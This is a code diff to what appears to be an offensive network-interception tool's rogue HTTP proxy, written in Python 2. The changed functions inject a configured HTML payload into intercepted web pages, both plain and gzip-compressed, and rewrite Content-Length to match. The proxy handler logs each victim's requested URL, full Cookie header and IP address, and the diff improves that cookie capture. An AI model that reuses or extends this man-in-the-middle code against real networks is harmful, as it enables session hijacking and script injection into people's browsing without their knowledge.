@@ -1180,7 +1180,7 @@ class HTTP(BaseRequestHandler):
 #HTTP Proxy Stuff
 ##################################################################################
 def HandleGzip(Headers, Content, Payload):
-    if len(Content) > 10:
+    if len(Content) > 5:
        try:
           unziped = zlib.decompress(Content, 16+zlib.MAX_WBITS)
        except:
@@ -1190,7 +1190,7 @@ def HandleGzip(Headers, Content, Payload):
        HasHTML = re.findall('(?<=<html)[^<]*', unziped)
        if HasHTML :
           if Verbose == True:
-             print 'Injecting: %s into the original page'%(config.get('HTTP Server','HTMLToServe'))  
+             print 'Injecting: %s into the original page'%(Payload)  
           Content = unziped.replace("<html", Payload+"\n<html")
           ziped = zlib.compress(Content)
           FinalLen = str(len(ziped))
@@ -1201,9 +1201,13 @@ def HandleGzip(Headers, Content, Payload):
     else:
        return False
    
-def InjectData(data, Payload):
+def InjectData(data):
+    Payload = config.get('HTTP Server','HTMLToServe')
     if len(data.split('\r\n\r\n'))>1:
-       Headers, Content = data.split('\r\n\r\n')
+       try:
+          Headers, Content = data.split('\r\n\r\n')
+       except:
+          return data
        RedirectCodes = ['HTTP/1.1 300', 'HTTP/1.1 301', 'HTTP/1.1 302', 'HTTP/1.1 303', 'HTTP/1.1 304', 'HTTP/1.1 305', 'HTTP/1.1 306', 'HTTP/1.1 307']
        if [s for s in RedirectCodes if s in Headers]:
           return data
@@ -1218,7 +1222,7 @@ def InjectData(data, Payload):
           HasHTML = re.findall('(?<=<html)[^<]*', Content)
           if HasHTML :
              if Verbose == True:
-                print 'Injecting: %s into the original page'%(config.get('HTTP Server','HTMLToServe'))  
+                print 'Injecting: %s into the original page'%(Payload)  
              NewContent = Content.replace("<html", Payload+"\n<html")
              FinalLen = str(len(NewContent))
              Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+FinalLen)
@@ -1288,11 +1292,10 @@ class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
                                                                     params, query,
                                                                     '')),
                                                self.request_version))
-                    for headers in self.headers.items():
-                        if "cookie" in headers:
-                           Cookie = self.headers['Cookie']
-                        else:
-                           Cookie = ''
+                    if "Cookie" in self.headers:
+                       Cookie = self.headers['Cookie']
+                    else:
+                       Cookie = ''
                     Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s\n"%(self.path, Cookie, self.client_address[0])
                     if Verbose == True:
                        print Message
@@ -1306,7 +1309,7 @@ class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
                     try:
                       self._read_write(soc, netloc)
                     except:
-                      pass  
+                      raise  
 
         finally:
             soc.close()
@@ -1327,7 +1330,7 @@ class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
                        out = self.connection
                        try:
                           if len(config.get('HTTP Server','HTMLToServe'))>5:
-                             data = InjectData(i.recv(8192), config.get('HTTP Server','HTMLToServe'))
+                             data = InjectData(i.recv(8192))
                           else:
                              data = i.recv(8192)
                        except:
